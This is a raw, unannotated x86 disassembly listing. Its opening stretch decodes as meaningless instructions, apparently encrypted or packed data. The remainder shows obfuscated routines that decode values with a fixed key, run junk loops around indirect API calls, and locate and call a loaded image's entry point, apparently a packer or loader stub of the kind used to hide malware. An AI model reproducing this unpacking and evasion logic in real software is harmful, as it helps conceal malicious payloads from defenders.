  40d6b4:	loopne 0x40d727
  40d6b6:	aam    0x7b
  40d6b8:	push   eax
  40d6b9:	or     al,0xc8
  40d6bb:	in     al,0x11
  40d6bd:	dec    esi
  40d6be:	jg     0x40d73a
  40d6c0:	jle    0x40d6d6
  40d6c2:	clc    
  40d6c3:	std    
  40d6c4:	xchg   esi,eax
  40d6c5:	push   esi
  40d6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6c7:	sbb    eax,0x48250135
  40d6cc:	stc    
  40d6cd:	loopne 0x40d743
  40d6cf:	aas    
  40d6d0:	xor    DWORD PTR [edx],0xffffff82
  40d6d3:	cmp    DWORD PTR [edi+esi*2-0x5d3cd1da],ebp
  40d6da:	pop    es
  40d6db:	ja     0x40d6f1
  40d6dd:	iret   
  40d6de:	cmp    BYTE PTR [eax+0x4e2b3750],al
  40d6e4:	xchg   esi,eax
  40d6e5:	xor    eax,DWORD PTR [eax+eax*2-0x75]
  40d6e9:	in     eax,0xa5
  40d6eb:	ror    ebx,1
  40d6ed:	call   0x42f2da70
  40d6f2:	nop
  40d6f3:	test   DWORD PTR [edi+0x45],edx
  40d6f6:	mov    eax,fs
  40d6f8:	clc    
  40d6f9:	push   es
  40d6fa:	jmp    0x40d74b
  40d6fc:	or     dh,BYTE PTR [esp+eax*1]
  40d6ff:	arpl   si,sp
  40d701:	jns    0x40d735
  40d703:	into   
  40d704:	ficom  WORD PTR [edx+edx*8-0x71172aed]
  40d70b:	out    dx,eax
  40d70c:	dec    ebp
  40d70d:	aaa    
  40d70e:	retf   0x900a
  40d711:	xchg   BYTE PTR [ecx+0x1efcf71e],al
  40d717:	mov    WORD PTR [ebx+0x103eb578],ss
  40d71d:	rol    BYTE PTR [edi],1
  40d71f:	mov    edi,0xb41a5301
  40d724:	jae    0x40d749
  40d726:	adc    eax,0xa27f9b46
  40d72b:	lock cs sbb al,0xc0
  40d72f:	dec    edi
  40d730:	pop    ds
  40d731:	xchg   BYTE PTR [ebx+0x48bdaec8],bh
  40d737:	mov    dh,BYTE PTR [ebx+0x3b]
  40d73a:	mov    ds,WORD PTR [eax+edx*2+0x12]
  40d73e:	jl     0x40d7a1
  40d740:	mov    BYTE PTR [edx-0x51adf743],bl
  40d746:	scas   eax,DWORD PTR es:[edi]
  40d747:	jecxz  0x40d7ad
  40d749:	sub    eax,0x8f72b9d5
  40d74e:	push   es
  40d74f:	into   
  40d750:	sub    ah,0x79
  40d753:	jle    0x40d6f7
  40d755:	popf   
  40d756:	shl    BYTE PTR [ebx-0x2488d241],1
  40d75c:	mov    ch,0x5c
  40d75e:	xchg   edi,eax
  40d75f:	(bad)  
  40d760:	call   0x6c5d7e4f
  40d765:	push   0x4b76d83a
  40d76a:	adc    BYTE PTR [ebx-0x3d9d6424],bl
  40d770:	xlat   BYTE PTR ds:[ebx]
  40d771:	in     eax,0xb1
  40d773:	mov    dl,dh
  40d775:	inc    ebp
  40d776:	mov    DWORD PTR [esi+0x62392eb7],edx
  40d77c:	adc    dl,ch
  40d77e:	mov    cl,0xd0
  40d780:	push   cs
  40d781:	inc    ecx
  40d782:	(bad)  
  40d783:	popa   
  40d784:	test   eax,0xdd635ca5
  40d789:	xor    ecx,DWORD PTR [esi-0x2d]
  40d78c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d78d:	inc    ebp
  40d78e:	adc    al,0xd5
  40d790:	js     0x40d744
  40d792:	or     DWORD PTR [eax+0x1bf6798e],edi
  40d798:	mov    cl,0xde
  40d79a:	and    bh,0x73
  40d79d:	xchg   BYTE PTR [ebp+0x533a1f4d],ah
  40d7a3:	add    al,0x19
  40d7a5:	(bad)  
  40d7a7:	lea    ebp,[esp+esi*1+0x79]
  40d7ab:	test   DWORD PTR [edx+0x587a7105],eax
  40d7b1:	push   0x77397f63
  40d7b6:	xchg   ebx,eax
  40d7b7:	call   0xfce30d3f
  40d7bc:	push   ebp
  40d7bd:	fadd   st(1),st
  40d7bf:	arpl   WORD PTR [eax-0x7c],dx
  40d7c2:	and    BYTE PTR [ecx-0x6361c3ca],bh
  40d7c8:	inc    edi
  40d7c9:	mov    ds:0xffca7e0b,al
  40d7ce:	out    0xbe,al
  40d7d0:	test   eax,0x2990ea3b
  40d7d5:	sbb    ebp,DWORD PTR [edx-0x5839e624]
  40d7db:	aaa    
  40d7dc:	enter  0x1fcd,0x80
  40d7e0:	pop    ecx
  40d7e1:	sbb    al,al
  40d7e3:	inc    esp
  40d7e4:	jmp    0x8fd19e1e
  40d7e9:	and    esi,DWORD PTR [ecx-0x61]
  40d7ec:	mov    ds:0x1b4d66ef,eax
  40d7f1:	jg     0x40d78a
  40d7f3:	xor    eax,esi
  40d7f5:	popf   
  40d7f6:	jb     0x40d860
  40d7f8:	dec    ebx
  40d7f9:	and    al,0xa6
  40d7fb:	add    bh,cl
  40d7fd:	in     eax,0x77
  40d7ff:	sbb    al,0x84
  40d801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d802:	xchg   edi,eax
  40d803:	cs in  al,dx
  40d805:	push   ds
  40d806:	iret   
  40d807:	dec    esp
  40d808:	push   esi
  40d809:	cmp    BYTE PTR [ecx-0x6a],bl
  40d80c:	xchg   ecx,eax
  40d80d:	pushf  
  40d80e:	test   BYTE PTR [ebx+0x6d],0x71
  40d812:	ins    DWORD PTR es:[edi],dx
  40d813:	xor    eax,0x5d69e0af
  40d818:	mov    ds:0x872877f8,al
  40d81d:	mov    esp,ebp
  40d81f:	cmp    bh,BYTE PTR [esi+0x7d]
  40d822:	std    
  40d823:	inc    esi
  40d824:	push   0x2473891d
  40d829:	hlt    
  40d82a:	(bad)  
  40d82b:	sub    al,ah
  40d82d:	push   cs
  40d82e:	xor    al,0x46
  40d830:	sbb    esp,DWORD PTR [ecx+eax*8]
  40d833:	mov    ah,0x9
  40d835:	or     eax,0xc4cddfbf
  40d83a:	arpl   WORD PTR [eax+0x69],dx
  40d83d:	ja     0x40d8bd
  40d83f:	sub    esp,DWORD PTR [ecx+0x7df18122]
  40d845:	inc    esi
  40d846:	inc    eax
  40d847:	pop    ebp
  40d848:	jne    0x40d8b4
  40d84a:	sub    cl,BYTE PTR [edx+edx*2+0x72]
  40d84e:	fwait
  40d84f:	or     BYTE PTR [ecx-0x39f8675],ah
  40d855:	imul   eax,ebp,0x3b
  40d858:	add    ch,BYTE PTR [ebp+0x4]
  40d85b:	inc    edi
  40d85c:	xchg   BYTE PTR [edx+ebp*4-0x1e],dh
  40d860:	add    al,0xcd
  40d862:	fsub   st(2),st
  40d864:	mov    BYTE PTR [ebx-0x442d5717],al
  40d86a:	mov    ch,0xd8
  40d86c:	inc    esi
  40d86d:	fnstsw WORD PTR cs:[esp-0xf82fcf4]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fc69,0x42e09c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fcf6,0x42fc71
  40d8af:	call   DWORD PTR ds:0x42e417
  40d8b5:	and    DWORD PTR ds:0x42fc7d,0x42fd02
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e0b4,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e0a4,0x42fc69
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e48f
  40d8ee:	sbb    DWORD PTR ds:0x42e67b,0x42fcf2
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fc75,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e3d7
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fc85,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fcf6,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e0a4,0x42e677
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fcee,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fc6d,0x42e098
  40d977:	call   DWORD PTR ds:0x42e41f
  40d97d:	mov    DWORD PTR ds:0x42e09c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e30f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fc81,0x42e0b4
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fc6d,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e27b
  40d9be:	mov    DWORD PTR ds:0x42fd0a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e098,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fc75,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fc75
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fc75,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fc75,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e10d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e4cf
  40da20:	cmp    DWORD PTR ds:0x42fc75,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fc75
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fc75,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fc75,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e683,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e673,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fc51,0x42e09c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fc85,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fc85,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fc85,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e4d3
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fc85
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fc85,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e687,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e687,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e687,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e3e3
  40dae4:	cmp    DWORD PTR ds:0x42e687,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e687
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e687,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e687
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e687,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e67f,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e67f,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e67f,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e4d7
  40db41:	cmp    DWORD PTR ds:0x42e67f,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e67f
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e67f,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e67f
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e67f,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fcf6,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fcf6,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fcf6,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e4db
  40db97:	cmp    DWORD PTR ds:0x42fcf6,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fcf6
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fcf6,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fcf6
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fcf6,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e687,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e693,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fcfe,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fc65,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fc65
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fc65,edi
  40dc13:	cmp    DWORD PTR ds:0x42fc65,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fc65,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e3e7
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e0a8,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fc81,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fc89,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e677,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e677,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e677,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e3eb
  40dcaa:	cmp    DWORD PTR ds:0x42e677,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e677
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e677,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e677
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e677,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd02,0x42e0ac
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd02,0x42e0a4
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fc51,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e098,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fcf2,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fcf2
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fcf2,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fcf2,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fcf2,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e3ef
  40dd4f:	cmp    DWORD PTR ds:0x42fcf2,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fcf2
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fcf2,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fc8d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e0b0,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fc89,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd06,0x42fc7d
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e673,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e67f,0x42fd0a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e66b
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fc65,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fc65
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fc65,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fc65,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fc89
  40de0d:	push   0x42e1ed
  40de12:	call   DWORD PTR ds:0x42e3f3
  40de18:	cmp    DWORD PTR ds:0x42fc65,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fca1
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fc7d,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fc75,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fc75,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fc75,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e4df
  40de65:	mov    edx,DWORD PTR ds:0x42fc75
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fc75,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fc69,0x42fc55
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fc69
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
